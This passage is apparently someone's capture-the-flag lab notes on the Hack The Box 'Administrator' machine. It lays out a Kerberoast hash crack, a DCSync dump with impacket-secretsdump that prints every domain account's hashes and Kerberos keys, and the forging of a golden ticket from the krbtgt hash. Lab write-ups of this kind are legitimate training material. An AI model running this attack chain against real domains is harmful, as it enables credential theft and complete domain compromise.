3f06d627003e8320987ddcac866a2941fd1b672c256af522d8412286bcc07f3f4ca3bcb2c6fb87e67faef8314cbcb654c6ece1d272929b7f5ae3ba2d112acd2a9a89a58e1183fbfc2fe77aa6386e354526fdc493f4dc7bffec13541ff92b4d6f197202ac42600869acb23631c88c3bcec945f7a4261e84c763503affa2691df30373e145c00b4fc10d1df6973beb39c12e643f8c5e4c500b387f43e248153fd7704509b4971e9371b3b04d23a18ad3aeaf29827ea69495ae47f3d221e93e785630d5ea1cb0c8c4feda24166c22f69b17f8df1cd09d623e07d509970e62cbc9074537999ebe3ef912356c044c6e50a90a0bf0d0e89e7571a4b177ff04a5dc777baee267b91b988b7f5ad99b75b59a9ebfa690f8ae35473bd3191eba75a4674a1612eb2fa1c24c4bb4067895e3b5ff9fa91ad5022b527ce84bce9e1c816761ad906253f352dcf31f522b52b53c796a4b5c273b8c9994d6723a3074a2c15d842710a9860d78bcee0ac7597497d0946cb2aa662850b8168080870bcc6863faf69807e6262600b2e4db88235b26a992508ee21dce6dce7d5bb9a798dffe659192860a640e1be9997fdc572b0804e5c
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ hashcat --identify hash                                            
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```
```Bash
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
````
> ALTERNATIVE TO BLOODYAD BELOW using [targetedkerberroast](https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file)
```Bash
faketime 'now + 7 hours' ./targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
> again, since my vm sucks, I grabbed the crack from juan: *limpbizkit*

Time to DCSync with Ethan:
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.10.11.42                                   
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:93ddd7e1a4fcd8cc0ffd41c4c14c75e4:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:93ddd7e1a4fcd8cc0ffd41c4c14c75e4:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:79a75a80d8b2166f3a4bd1e9fd4299331b68ebeb7b0b68fb8d3c20c8d57bc7f5
administrator.htb\michael:aes128-cts-hmac-sha1-96:5f51681329845de15be4fd41342bd905
administrator.htb\michael:des-cbc-md5:f4fef8e016bcdafd
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:fd757bab1c6bd5fe546142c516da76237336445961d37c3bd4b157c452d63081
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:d91d3062f402a87dbad5db3dcf5c4f9e
administrator.htb\benjamin:des-cbc-md5:32d5346107ba318c
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```
Something something we have golden tickets?\
remind me to ask Juan\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/edc5ac56-3eea-4614-8fd2-6142125eb998) returned 404 during the image audit (2026-10-08).


it looks like the important line from above is: *krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::*

We need *ticketer.py*. 
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ impacket-ticketer                                                    
Impacket v0.11.0 - Copyright 2023 Fortra

usage: ticketer.py [-h] [-spn SPN] [-request] -domain DOMAIN -domain-sid DOMAIN_SID [-aesKey hex key] [-nthash NTHASH] [-keytab KEYTAB] [-groups GROUPS]
                   [-user-id USER_ID] [-extra-sid EXTRA_SID] [-extra-pac] [-old-pac] [-duration DURATION] [-ts] [-debug] [-user USER] [-password PASSWORD]
                   [-hashes LMHASH:NTHASH] [-dc-ip ip address]
                   target

Creates a Kerberos golden/silver tickets based on user options

positional arguments:
  target                username for the newly created ticket

options:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the silver ticket will be generated for. if omitted, golden ticket will be created
  -request              Requests ticket to domain and clones it changing only the supplied information. It requires specifying -user
  -domain DOMAIN        the fully qualified domain name (e.g. contoso.com)
  -domain-sid DOMAIN_SID
                        Domain SID of the target domain the ticker will be generated for
  -aesKey hex key       AES key used for signing the ticket (128 or 256 bits)
  -nthash NTHASH        NT hash used for signing the ticket
  -keytab KEYTAB        Read keys for SPN from keytab file (silver ticket only)
  -groups GROUPS        comma separated list of groups user will belong to (default = 513, 512, 520, 518, 519)
  -user-id USER_ID      user id for the user the ticket will be created for (default = 500)
  -extra-sid EXTRA_SID  Comma separated list of ExtraSids to be included inside the ticket's PAC
  -extra-pac            Populate your ticket with extra PAC (UPN_DNS)
  -old-pac              Use the old PAC structure to create your ticket (exclude PAC_ATTRIBUTES_INFO and PAC_REQUESTOR
  -duration DURATION    Amount of hours till the ticket expires (default = 24*365*10)
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -user USER            domain/username to be used if -request is chosen (it can be different from domain/username
  -password PASSWORD    password for domain/username
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter

Examples: 
        ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser

        will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
        If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
        (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
        baduser.ccache.

        ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser

        will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
        as template for customization. Whatever encryption algorithms used on that ticket will be honored,
        hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'
        and saved as baduser.ccache
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ impacket-ticketer -domain-sid S-1-5-21-1088858960-373806567-2541894 -domain administrator.htb -nthash 1181ba47d45fa2c76385a82409cbfaf6 -user administrator administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for administrator.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ ls
administrator.ccache  Backup.psafe3  hash
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ file administrator.ccache                                                                                                        
administrator.ccache: data
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ cat administrator.ccache 

administratorADMINISTRATOR.HTBkrbtgtADMINISTRATOR.HTBUZDIOVdFFaoAVJDkg�M�g�M�z`P�z`P�P�#a�0��DMINISTRATOR.HTB�&0$��0rbtgtDMINISTRATOR.HTB���0�Ѡ��������}���u�I��A�]+wBO�W�0�Fqy���ڍf�o�LP�
                              yӐ������nw�ơL&�sD�-8П�A���(��{:��^`E=�`Φ�T�\11u�~��B��1>Ln�PP8���� �z�n�
                                                                                                     ��seϑL�Y��▒S���Iz�q�c|��5^���:�流���ӱ�m���b��T�*����d����Χ߿�U�g�܉h=y�389�G�dB����؊~�b��6��
��� 0C�sPe�E�����W▒e��k=           ���=������mb�>�
        ��{\h�l
               ����;B��▒�ռX����&��d��VF,��▒o��l�������ů�=�K<�vЦ�j�I����,ZRS�&�o#1���L\���$ԗc��j�\��X��Pd�pth�M�y��
                                                                                                                  :8XlW�����f`�Wh�'�atu�|�U+O�j�,ig��T��·v��Pq�j`�#�VU���:=n���%
                    ��e�.�W4���e��FL_�}w�:=}���=��\O�ev�,���h/9���L&��Yl��M����▒H�����[� ����G2\h޽5&y_�Bd[����ZF�����YO�
                                                                                                                        %�2��~l�Mc�Dw
�"-rjmGA$����v.���Y����18       �C���G"@�rѐ�▒1��������y������Д���>K▒�����
                                                                         u�`�(x"�       ��p
7:��-l�e�A������G��$lD�/3��ך��+In����)U������C[���P���!I����+�#��&���QCט��W:v��&��B�c�zjԯ�9�&y�O'�6�<���Y
#�q���L����
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ sudo apt install krb5-user

┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ klist -c administrator.ccache

Ticket cache: FILE:administrator.ccache
Default principal: administrator@ADMINISTRATOR.HTB

Valid starting       Expires              Service principal
01/25/2025 04:40:07  01/23/2035 04:40:07  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
        renew until 01/23/2035 04:40:07
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ sudo ntpdate -q 10.10.11.42  

2025-01-25 04:42:24.909616 (-0500) +10.671326 +/- 0.044663 10.10.11.42 s1 no-leap
```

> **TODO** *ASK JUAN HOW TO CONTINUE*


